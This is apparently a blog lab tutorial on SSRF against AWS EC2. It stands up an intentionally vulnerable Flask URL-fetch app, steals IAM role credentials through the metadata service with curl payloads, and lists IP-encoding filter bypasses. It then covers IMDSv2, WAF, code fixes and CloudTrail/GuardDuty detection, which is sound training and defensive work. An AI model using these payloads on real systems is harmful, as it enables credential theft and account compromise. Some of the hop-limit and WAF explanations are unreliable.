---
layout: post
title: "Lab: SSRF to IMDS: Steal AWS Credentials Through a Web App"
date: 2026-06-22T10:00:00
categories:
  - AWS Security Labs
  - GuardDuty lab
tags:
  - aws
  - ssrf
  - imds
  - imdsv2
  - guardduty
  - waf
  - ec2
  - cloud-attack
  - detection-engineering
  - lab
author: muhammed
description: A hands-on lab demonstrating how a Server-Side Request Forgery (SSRF) vulnerability in a web application lets an attacker steal EC2 IAM credentials through the Instance Metadata Service - and exactly how IMDSv2 and WAF cut this attack at the root.
toc: true
pin: false
math: false
mermaid: false
image:
---

## Objective

Exploit a Server-Side Request Forgery (SSRF) vulnerability in a deliberately insecure web application to reach the EC2 Instance Metadata Service (IMDS) and steal IAM credentials - without ever getting a shell on the server.

Then harden the environment three ways: IMDSv2, WAF, and application-level input validation.

**Run this only in an AWS account you own.**

---

## Why This Attack Matters

In the previous lab, you needed RCE to reach the IMDS.
SSRF is worse - it requires **only a browser and a URL**.

The IMDS sits at `169.254.169.254` - reachable from inside the EC2 instance only.
An SSRF vulnerability makes the server fetch URLs on your behalf.
So the server becomes a proxy: your browser → vulnerable app → IMDS → credentials back to you.

This is how the 2019 Capital One breach happened.
An attacker exploited an SSRF in a WAF misconfiguration, reached the IMDS of an EC2 instance, stole the IAM role credentials, and exfiltrated over 100 million customer records from S3.

---

## Attack Chain

```
Attacker browser
    │
    │  1. Send SSRF payload in HTTP request
    ▼
Vulnerable web app (running on EC2)
    │
    │  2. App fetches http://169.254.169.254/latest/meta-data/...
    │     on behalf of attacker
    ▼
IMDS (Instance Metadata Service)
    │
    │  3. Returns IAM role credentials in response
    ▼
Attacker receives credentials in HTTP response body
    │
    │  4. Use credentials externally → enumerate S3, escalate privileges
    ▼
AWS account compromised - no shell ever required
```

---

## What You Will Learn

- What SSRF is and why it is so dangerous in cloud environments
- How the IMDS endpoint works and why it is reachable via SSRF
- Why IMDSv2 with hop limit 1 completely blocks this attack
- How to write a WAF rule that catches SSRF attempts
- How to fix SSRF in application code

---

## Phase 0: Setup

### Step 0.1: Enable GuardDuty

```bash
aws guardduty create-detector \
  --enable \
  --finding-publishing-frequency FIFTEEN_MINUTES
```

---

### Step 0.2: Create an IAM Role for the Victim EC2

```bash
cat > ec2-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "ec2.amazonaws.com"},
    "Action": "sts:AssumeRole"
  }]
}
EOF

aws iam create-role \
  --role-name ssrf-lab-ec2-role \
  --assume-role-policy-document file://ec2-trust.json

aws iam attach-role-policy \
  --role-name ssrf-lab-ec2-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess

aws iam create-instance-profile \
  --instance-profile-name ssrf-lab-profile

aws iam add-role-to-instance-profile \
  --instance-profile-name ssrf-lab-profile \
  --role-name ssrf-lab-ec2-role
```

---

### Step 0.3: Launch the Victim EC2 with IMDSv1 Enabled

IMDSv1 is the default on older instances - no token required, plain `curl` works.

```bash
aws ec2 run-instances \
  --image-id ami-0c02fb55956c7d316 \
  --instance-type t3.micro \
  --iam-instance-profile Name=ssrf-lab-profile \
  --metadata-options HttpTokens=optional,HttpPutResponseHopLimit=2 \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=ssrf-victim}]' \
  --user-data '#!/bin/bash
yum update -y
yum install -y python3 python3-pip
pip3 install flask requests

cat > /home/ec2-user/app.py << '"'"'APPEOF'"'"'
from flask import Flask, request
import requests

app = Flask(__name__)

# VULNERABLE endpoint: fetches any URL the user provides
# This simulates a "URL preview" or "webhook test" feature
@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    if not url:
        return "Provide a ?url= parameter", 400
    try:
        response = requests.get(url, timeout=5)
        return response.text, 200
    except Exception as e:
        return str(e), 500

@app.route("/")
def index():
    return "<h1>Web App</h1><p>Use /fetch?url=https://example.com to preview URLs</p>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
APPEOF

python3 /home/ec2-user/app.py &
'
```

Security group - inbound HTTP only:

```
Inbound:  80/tcp  0.0.0.0/0
Outbound: ALL     0.0.0.0/0
```

> 📸 **SCREENSHOT:** EC2 console showing ssrf-victim instance running with the ssrf-lab-profile attached

---

### Step 0.4: Verify the App is Running

```bash
curl http://VICTIM_IP/
# Returns: Web App: Use /fetch?url=https://example.com to preview URLs

# Confirm the URL fetch feature works on a legitimate URL
curl "http://VICTIM_IP/fetch?url=https://example.com"
# Returns: HTML content of example.com
```

> 📸 **SCREENSHOT:** Browser showing the app at `http://VICTIM_IP/` and the fetch feature working with `https://example.com`

---

## Phase 1: Discover the SSRF

The `/fetch` endpoint takes a URL and fetches it server-side.
There is no validation - it will fetch any URL, including internal ones.

### Step 1.1: Test with an Internal IP

Start with a basic internal network probe to confirm SSRF works:

```bash
# Does the server reach its own localhost?
curl "http://VICTIM_IP/fetch?url=http://127.0.0.1/"
# Returns: the Flask app's own homepage: SSRF confirmed
```

### Step 1.2: Probe the IMDS IP

```bash
# Try reaching the IMDS magic IP
curl "http://VICTIM_IP/fetch?url=http://169.254.169.254/"
```

Output - the server returns the IMDS index:

```
1.0
2007-01-19
2007-03-01
2007-08-29
...
latest
```

The EC2 instance fetched its own metadata and returned it in the HTTP response.
You are reading internal EC2 metadata from your browser with no authentication.

> 📸 **SCREENSHOT:** curl output showing the IMDS version listing returned through the SSRF

---

## Phase 2: Steal IAM Credentials via SSRF

### Step 2.1: Walk the Metadata Tree

```bash
# List available metadata categories
curl "http://VICTIM_IP/fetch?url=http://169.254.169.254/latest/meta-data/"
```

Output:

```
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
...
```

### Step 2.2: Get the IAM Role Name

```bash
curl "http://VICTIM_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Output:

```
ssrf-lab-ec2-role
```

### Step 2.3: Extract the Credentials

```bash
curl "http://VICTIM_IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ssrf-lab-ec2-role"
```

Output - full credentials in the HTTP response body, visible in your browser:

```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-06-22T09:44:12Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "AQoDYXdzEJr...",
  "Expiration" : "2026-06-22T16:00:00Z"
}
```

You have valid AWS credentials.
You never got a shell.
You never touched the server.
You clicked a URL in a browser.

> 📸 **SCREENSHOT:** Browser showing the full JSON credential response returned through the SSRF - highlight the AccessKeyId and SecretAccessKey fields

### Step 2.4: Use the Stolen Credentials

```bash
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoDYXdzEJr...

aws sts get-caller-identity
# Returns: the ssrf-lab-ec2-role identity

aws s3 ls
# Lists all S3 buckets the role can access
```

> 📸 **SCREENSHOT:** Terminal showing `aws sts get-caller-identity` confirming you are operating as the stolen EC2 role

**GuardDuty finding:**

```
UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
```

GuardDuty does not care how the credentials were stolen. What it cares about is **where they get used**, and the trigger condition is narrower than it first looks:

| Finding | Fires when the credentials are used from |
|---------|------------------------------------------|
| `InstanceCredentialExfiltration.OutsideAWS` | A host **outside of AWS entirely** |
| `InstanceCredentialExfiltration.InsideAWS` | An IP or VPC endpoint owned by a **different AWS account** |

In this lab you run `aws sts get-caller-identity` from your own laptop, which is genuinely outside AWS, so `.OutsideAWS` fires. Had you run it from another EC2 instance in this same account, **neither finding would have fired**. Phase 7 covers that gap and what to do about it.

> 📸 **SCREENSHOT:** GuardDuty finding showing InstanceCredentialExfiltration.OutsideAWS with High severity

---

## Phase 3: Defense 1: IMDSv2 Blocks This Completely

IMDSv2 requires a PUT request with a session token header before any metadata can be read.
A standard HTTP GET request returns nothing.

The critical detail is the **hop limit**.
When set to 1, the PUT request that generates the session token cannot travel through any proxy - the TTL is decremented to zero before the response returns.
SSRF goes through one extra hop (browser → app → IMDS) which exceeds the limit.

### Step 3.1: Enable IMDSv2 on the Running Instance

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-VICTIM_ID \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

### Step 3.2: Try the Same SSRF Attack Again

```bash
curl "http://VICTIM_IP/fetch?url=http://169.254.169.254/latest/meta-data/"
```

Output:

```
401 - Unauthorized
```

The SSRF still reaches the IMDS - but IMDSv2 requires the app to first do a PUT:

```bash
# What IMDSv2 actually requires:
# Step 1: get a session token via PUT
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: use the token in every subsequent GET
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/"
```

The vulnerable `/fetch` endpoint only does GET requests.
It cannot do a PUT first.
Even if the attacker crafts a PUT via SSRF, the hop limit of 1 means the token never makes it back - it expires in transit.

> 📸 **SCREENSHOT:** curl showing `401 Unauthorized` when trying the SSRF against the IMDSv2-enforced instance

**Why hop limit 1 specifically blocks SSRF:**

```
IMDSv2 with hop limit 2 (the old default):
  Browser → App (hop 1) → IMDS (hop 2) → response returns ✓ SSRF works

IMDSv2 with hop limit 1:
  Browser → App (hop 1) → IMDS  ← TTL=0, packet dropped ✗ SSRF blocked
  (direct from EC2 shell: EC2 → IMDS = 1 hop ✓ legitimate access still works)
```

Hop limit 1 means only direct requests from the EC2 instance itself can reach the IMDS.
Any proxied request - SSRF, containers, VMs-within-VMs - is blocked.

---

## Phase 4: Defense 2: WAF Rule to Catch SSRF Attempts

IMDSv2 blocks the exploit.
WAF blocks the attempt before it ever reaches your app - giving you an alert and a log entry.

### Step 4.1: Create a WAF Web ACL with an SSRF Rule

```bash
# Create the Web ACL
aws wafv2 create-web-acl \
  --name ssrf-protection-acl \
  --scope REGIONAL \
  --default-action Allow={} \
  --rules '[
    {
      "Name": "BlockIMDSAccess",
      "Priority": 1,
      "Statement": {
        "OrStatement": {
          "Statements": [
            {
              "ByteMatchStatement": {
                "SearchString": "169.254.169.254",
                "FieldToMatch": {"AllQueryArguments": {}},
                "TextTransformations": [{"Priority": 0, "Type": "URL_DECODE"}],
                "PositionalConstraint": "CONTAINS"
              }
            },
            {
              "ByteMatchStatement": {
                "SearchString": "169.254.169.254",
                "FieldToMatch": {"Body": {}},
                "TextTransformations": [{"Priority": 0, "Type": "URL_DECODE"}],
                "PositionalConstraint": "CONTAINS"
              }
            }
          ]
        }
      },
      "Action": {"Block": {}},
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "BlockIMDSAccess"
      }
    }
  ]' \
  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=ssrf-acl \
  --region eu-west-1
```

### Step 4.2: Test the WAF Rule

```bash
# This request is now blocked before it reaches your Flask app
curl "http://VICTIM_IP/fetch?url=http://169.254.169.254/latest/meta-data/"
# Returns: 403 Forbidden: WAF block page
```

> 📸 **SCREENSHOT:** curl showing 403 response, and WAF console showing the blocked request in sampled requests with the rule `BlockIMDSAccess` matched

### Step 4.3: Also Block Common SSRF Bypasses

Attackers try to bypass IP-based filters using alternative representations:

```
http://169.254.169.254/         ← standard
http://0xa9fea9fe/              ← hex
http://2852039166/              ← decimal
http://169.254.169.254.nip.io/ ← DNS rebinding
http://[::ffff:169.254.169.254]/ ← IPv6 mapped
```

Add these to the WAF rule's OR statement - or use the AWS Managed Rule Group `AWSManagedRulesAnonymousIpList` which covers many of these.

---

## Phase 5: Defense 3: Fix the SSRF in the Application Code

WAF and IMDSv2 are network-level defenses.
The right fix is also at the application level - never make server-side requests to URLs provided by users without strict validation.

### The Vulnerable Code

```python
# VULNERABLE: fetches any URL the user provides
@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    response = requests.get(url, timeout=5)
    return response.text, 200
```

### The Fixed Code

```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = {"https"}
BLOCKED_RANGES = [
    ipaddress.ip_network("169.254.0.0/16"),   # IMDS and link-local
    ipaddress.ip_network("10.0.0.0/8"),        # Private RFC1918
    ipaddress.ip_network("172.16.0.0/12"),     # Private RFC1918
    ipaddress.ip_network("192.168.0.0/16"),    # Private RFC1918
    ipaddress.ip_network("127.0.0.0/8"),       # Loopback
    ipaddress.ip_network("0.0.0.0/8"),         # Current network
    ipaddress.ip_network("::1/128"),           # IPv6 loopback
]

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)

        # Only allow HTTPS
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False

        # Resolve hostname to IP and check it's not internal
        import socket
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return False

        return True
    except Exception:
        return False

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    if not is_safe_url(url):
        return "URL not allowed", 403
    response = requests.get(url, timeout=5, allow_redirects=False)
    return response.text, 200
```

Key decisions in this fix:

| Decision | Why |
|----------|-----|
| Allowlist schemes (`https` only) | Blocks `file://`, `gopher://`, `ftp://` SSRF vectors |
| Resolve hostname before fetching | Prevents DNS rebinding - check the IP, not the name |
| Block all RFC1918 + link-local ranges | Blocks IMDS, internal services, localhost |
| `allow_redirects=False` | Prevents redirect chains that bypass IP checks |

> 📸 **SCREENSHOT:** Testing the fixed endpoint - `?url=http://169.254.169.254/` now returns `403 URL not allowed`

---

## Phase 6: Full Defense Stack Summary

After applying all three defenses, the attack chain looks like this:

```
Attacker browser
    │
    │  Sends: /fetch?url=http://169.254.169.254/...
    │
    ├─ WAF catches the IMDS IP in the query string → 403 BLOCK
    │
    │  (if WAF is bypassed with hex/decimal encoding)
    │
    ├─ Application code resolves the IP → matches blocked range → 403 BLOCK
    │
    │  (if app code is bypassed somehow)
    │
    └─ IMDSv2 requires a PUT session token that can't travel through a proxy → 401 BLOCK
```

Three independent layers.
An attacker has to break all three simultaneously - which is not possible with this configuration.

---

## Phase 7: Detection: Covering the Gap GuardDuty Leaves

Everything above is prevention. This phase is detection, and it exists because of a specific gap.

### The Gap

Re-read the trigger conditions from Phase 2:

- `.OutsideAWS` needs the credentials used from a host outside AWS
- `.InsideAWS` needs a different AWS account

An attacker who steals instance credentials and uses them **from another EC2 instance in the same account** satisfies neither. GuardDuty stays silent. That is not a bug, it is the documented scope of those two findings, and it means relying on GuardDuty alone leaves the same-account case uncovered.

So write the detection yourself.

### What Stolen Instance Credentials Look Like in CloudTrail

EC2 instance role credentials have a distinctive signature. When the instance calls an API, CloudTrail records:

```json
{
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/ssrf-lab-ec2-role/i-0abcdef1234567890"
  },
  "sourceIPAddress": "54.12.34.56",
  "eventName": "ListBuckets"
}
```

The tell is the **session name**: for an instance role, it is the instance ID. Nothing else in AWS produces a session name shaped like `i-0abc...`.

That gives a rule with no ambiguity: credentials whose session name is an instance ID should only ever be used from that instance. Any other source IP means the credentials left the box.

### Query 1: Inventory Every Instance Credential Use

This requires CloudTrail delivering to a CloudWatch Logs group. Run in Logs Insights against that group:

```
fields @timestamp, sourceIPAddress, eventName, userIdentity.arn as principalArn
| filter userIdentity.type = "AssumedRole"
| parse principalArn "assumed-role/*/*" as roleName, sessionName
| filter sessionName like /^i-/
| stats count(*) as apiCalls,
        count_distinct(eventName) as distinctApis
    by sessionName, sourceIPAddress, roleName
| sort sessionName asc, apiCalls desc
```

This gives you one row per instance-and-source-IP pair. In a healthy account every instance shows exactly one source IP.

### Query 2: The Actual Detection

```
fields userIdentity.arn as principalArn, sourceIPAddress
| filter userIdentity.type = "AssumedRole"
| parse principalArn "assumed-role/*/*" as roleName, sessionName
| filter sessionName like /^i-/
| stats count_distinct(sourceIPAddress) as sourceIPCount,
        count(*) as totalCalls
    by sessionName, roleName
| filter sourceIPCount > 1
| sort sourceIPCount desc
```

One instance, more than one source IP. That is the signal, and it fires whether the attacker is outside AWS, in another account, or on the box next door.

> 📸 **SCREENSHOT:** Logs Insights showing Query 2 returning the victim instance with `sourceIPCount = 2` after the lab attack

### Validating It Actually Fires

A detection you have not tested is a guess. Prove it:

1. Run Phase 2 to steal the credentials through the SSRF
2. Use them from your laptop (`aws s3 ls`)
3. Wait for CloudTrail delivery, which takes up to 15 minutes
4. Run Query 2

The victim instance should come back with two distinct source IPs: its own, and yours. If it does not, check that CloudTrail is actually delivering to CloudWatch Logs and that your time range covers both.

### False Positives You Will Hit

Being honest about this matters more than the query itself:

| Cause | Why it produces a second IP | Handling |
|-------|----------------------------|----------|
| NAT gateway | Instance egresses via the NAT IP, not its own | Add the NAT IP to a known-good list per subnet |
| VPC endpoints | Calls through an interface endpoint show the endpoint ENI | Expected, baseline it |
| Public and private paths | Same instance reaching AWS two different ways | Expected, baseline it |
| Instance with multiple ENIs | More than one legitimate source | Rare, verify per instance |

The point is that `sourceIPCount > 1` is a **starting threshold**, not a finished alert. Run Query 1 for a week first, learn what normal looks like in your account, then tune.

### Turning It Into a Standing Alarm

The Logs Insights queries are for hunting. For continuous detection, a metric filter on the same log group:

```bash
aws logs put-metric-filter \
  --log-group-name CloudTrail/DefaultLogGroup \
  --filter-name imds-creds-used-off-instance \
  --filter-pattern '{ ($.userIdentity.type = "AssumedRole") && ($.userIdentity.arn = "*:assumed-role/*/i-*") && ($.sourceIPAddress != "10.0.*") }' \
  --metric-transformations \
      metricName=OffInstanceCredentialUse,metricNamespace=Security,metricValue=1

aws cloudwatch put-metric-alarm \
  --alarm-name off-instance-credential-use \
  --metric-name OffInstanceCredentialUse \
  --namespace Security \
  --statistic Sum \
  --period 300 \
  --threshold 1 \
  --comparison-operator GreaterThanOrEqualToThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:eu-west-1:ACCOUNT_ID:security-alerts
```

Replace `10.0.*` with your own VPC CIDR. This pattern is environment specific and will not work copy-pasted.

### Routing the GuardDuty Findings You Do Get

For the cases GuardDuty does cover, route them to SNS rather than waiting for someone to open the console:

```json
{
  "source": ["aws.guardduty"],
  "detail-type": ["GuardDuty Finding"],
  "detail": {
    "type": [
      "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS",
      "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS",
      "PenTest:IAMUser/KaliLinux"
    ]
  }
}
```

```bash
aws events put-rule \
  --name imds-credential-theft \
  --event-pattern file://guardduty-imds-pattern.json \
  --description "Route EC2 credential exfiltration findings to the security topic"

aws events put-targets \
  --rule imds-credential-theft \
  --targets 'Id=1,Arn=arn:aws:sns:eu-west-1:ACCOUNT_ID:security-alerts'
```

**Gotcha:** the SNS topic needs a resource policy allowing `events.amazonaws.com` to publish. Without it the rule matches, the target invocation fails silently, and you get no alert while the console shows the rule as healthy.

```bash
aws sns add-permission \
  --topic-arn arn:aws:sns:eu-west-1:ACCOUNT_ID:security-alerts \
  --label AllowEventBridgePublish \
  --aws-account-id ACCOUNT_ID \
  --action-name Publish
```

> 📸 **SCREENSHOT:** SNS email received from the EventBridge rule after the credential exfiltration finding fired

---

## GuardDuty Findings Summary

| Attack stage | GuardDuty finding |
|-------------|------------------|
| Stolen creds used from external IP | `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` |
| SSRF scanning internal IPs | `Recon:EC2/PortProbeUnprotectedPort` (if attacker scans other ports) |
| S3 access with stolen creds | `Discovery:S3/BucketEnumeration.Unusual` |

> 📸 **SCREENSHOT:** GuardDuty findings console showing all findings generated during this lab

---

## How This Connects to the Previous Lab

| | EC2 RCE Lab | SSRF Lab |
|---|-------------|----------|
| **Initial access** | Exploit WordPress plugin → shell | Exploit `/fetch` endpoint → no shell needed |
| **Credential theft** | `curl` from inside the shell | Browser request through the SSRF |
| **What stops it** | Restrict outbound + IMDSv2 | IMDSv2 + WAF + app validation |
| **GuardDuty finding** | Only if run from outside AWS. From the in-account Kali box, nothing fires | `InstanceCredentialExfiltration.OutsideAWS`, since the creds are used from your laptop |
| **How the attacker looks** | Noisy - reverse shell, many commands | Quiet - looks like a normal HTTP request |

SSRF is more dangerous in practice because it generates far less noise.
A reverse shell is obvious.
An SSRF looks exactly like a normal web request until GuardDuty fires on the credential use.

---

## Cleanup

```bash
# Terminate the EC2 instance
aws ec2 terminate-instances --instance-ids i-VICTIM_ID

# Delete the WAF Web ACL
aws wafv2 delete-web-acl \
  --name ssrf-protection-acl \
  --scope REGIONAL \
  --id WEB_ACL_ID \
  --lock-token LOCK_TOKEN

# Remove IAM role
aws iam remove-role-from-instance-profile \
  --instance-profile-name ssrf-lab-profile \
  --role-name ssrf-lab-ec2-role
aws iam detach-role-policy \
  --role-name ssrf-lab-ec2-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess
aws iam delete-instance-profile --instance-profile-name ssrf-lab-profile
aws iam delete-role --role-name ssrf-lab-ec2-role

# Disable GuardDuty
aws guardduty delete-detector --detector-id YOUR_DETECTOR_ID
```

---

## Key Takeaways

- SSRF turns a web application into a proxy - the server fetches internal resources on the attacker's behalf
- The IMDS is the most valuable internal target in any AWS environment - it hands out live IAM credentials
- IMDSv2 with hop limit 1 is the single most effective control - it makes SSRF against IMDS physically impossible
- Defense in depth matters - WAF catches attempts before they reach the app, app code blocks them before they reach the network, IMDSv2 blocks them at the destination
- GuardDuty fires on credential use, not on the SSRF itself - this is why application-layer controls matter
- GuardDuty's credential exfiltration findings have a documented gap: same-account use fires neither variant. Covering that gap needs a detection you write yourself, keyed on the instance ID appearing as the assumed-role session name
- A detection you have not triggered on purpose is a guess. Run the attack, then confirm the query returns the row

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
